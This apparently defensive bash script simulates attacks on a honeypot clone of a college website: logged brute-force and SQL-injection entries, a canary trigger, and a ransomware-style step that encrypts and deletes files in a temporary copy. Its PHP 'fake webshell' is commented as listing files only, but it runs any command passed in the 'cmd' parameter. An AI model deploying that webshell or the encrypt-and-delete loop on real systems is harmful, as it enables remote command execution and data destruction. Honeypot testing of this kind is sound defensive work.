#!/bin/bash
# ==========================================================
# attack_simulator.sh
# Honeypot Attack Simulator
# ----------------------------------------------------------
# This script safely simulates various cyberattacks such as:
# - Fake webshell upload
# - Brute-force logins
# - SQL injection
# - Ransomware encryption (reversible AES)
# - Canary file trigger
# - Logs events to /opt/honeypot_tools/events.log for dashboard
# ==========================================================

set -e
BASE="/var/www/html/college_clone_honeypot"
WORK="/tmp/hp_sim_work"
SIMDIR="/tmp/hp_sim_enc"
EVENTLOG="/opt/honeypot_tools/events.log"

# Clean previous simulation
rm -rf "$WORK" "$SIMDIR"
mkdir -p "$(dirname "$EVENTLOG")"
touch "$EVENTLOG"

# Clone honeypot content
cp -a "$BASE" "$WORK"
cd "$WORK"
echo "[*] Work dir: $WORK"

# ----------------------------------------------------------
# 1️⃣ Simulate upload of fake PHP webshell
# ----------------------------------------------------------
cat > "$WORK/uploaded_shell.php" <<'PHP'
<?php
// Fake webshell - lists files only
echo "<pre>";
$cmd = isset($_GET['cmd'])?$_GET['cmd']:'ls -la';
system($cmd);
echo "</pre>";
?>
PHP
echo "[*] Fake webshell deployed: $WORK/uploaded_shell.php"

# ----------------------------------------------------------
# 2️⃣ Simulated brute force attempts
# ----------------------------------------------------------
echo "[*] Simulating brute-force login attempts..."
for i in {1..5}; do
  ip="192.168.1.$((RANDOM%200+20))"
  echo "Failed login attempt $i for user=admin from $ip" >> "$WORK/fake_auth.log"
  echo "[$(date -u +%Y-%m-%dT%H:%M:%SZ)] WARN: LOGIN_FAIL: login failed for user=admin from $ip" | tee -a "$EVENTLOG"
  sleep 0.5
done

# ----------------------------------------------------------
# 3️⃣ Simulated SQL Injection
# ----------------------------------------------------------
echo "[*] Simulating SQL Injection attempt..."
attacker_ip="8.8.8.8"
echo "SQLi attempt: SELECT * FROM users WHERE username='admin' OR '1'='1' -- " >> "$WORK/fake_auth.log"
echo "[$(date -u +%Y-%m-%dT%H:%M:%SZ)] ALERT: SQLI_DETECTED: Malicious payload from $attacker_ip via query 'OR 1=1 --'" | tee -a "$EVENTLOG"

# ----------------------------------------------------------
# 4️⃣ Simulated ransomware encryption (reversible AES)
# ----------------------------------------------------------
echo "[*] Simulating ransomware encryption..."
mkdir -p "$SIMDIR"
cp -a "$WORK"/* "$SIMDIR/"
cd "$SIMDIR"

for f in $(find . -type f \( -iname "*.php" -o -iname "*.html" \) | head -n 30); do
  openssl enc -aes-256-cbc -pbkdf2 -salt -in "$f" -out "${f}.enc" -k "HoneypotDemoKey" 2>/dev/null
  rm -f "$f"
done

echo "[*] Encrypted files created (.enc). Example:"
find . -name "*.enc" | head -n 5
echo "SIMDIR=$SIMDIR"

echo "[$(date -u +%Y-%m-%dT%H:%M:%SZ)] CRITICAL: RANSOM_DETECTED: files encrypted on host; src=9.10.11.12" | tee -a "$EVENTLOG"

# ----------------------------------------------------------
# 5️⃣ Simulate Canary Trigger
# ----------------------------------------------------------
CANARY_PATH="/var/www/html/college_clone_honeypot/canary.txt"
touch "$CANARY_PATH"
echo "[$(date -u +%Y-%m-%dT%H:%M:%SZ)] HIGH: CANARY TOUCHED: Canary path triggered: $CANARY_PATH" | tee -a "$EVENTLOG"

# ----------------------------------------------------------
# 6️⃣ Simulate File Modifications
# ----------------------------------------------------------
echo "[*] Simulating file modifications..."
mod_ip="5.6.7.8"
echo "[$(date -u +%Y-%m-%dT%H:%M:%SZ)] INFO: FILE_MOD: Modified $BASE/index.php by $mod_ip" | tee -a "$EVENTLOG"

# ----------------------------------------------------------
# ✅ Simulation Complete
# ----------------------------------------------------------
echo "[$(date -u +%Y-%m-%dT%H:%M:%SZ)] INFO: Simulation completed successfully." | tee -a "$EVENTLOG"
echo "[+] Attack simulation finished!"
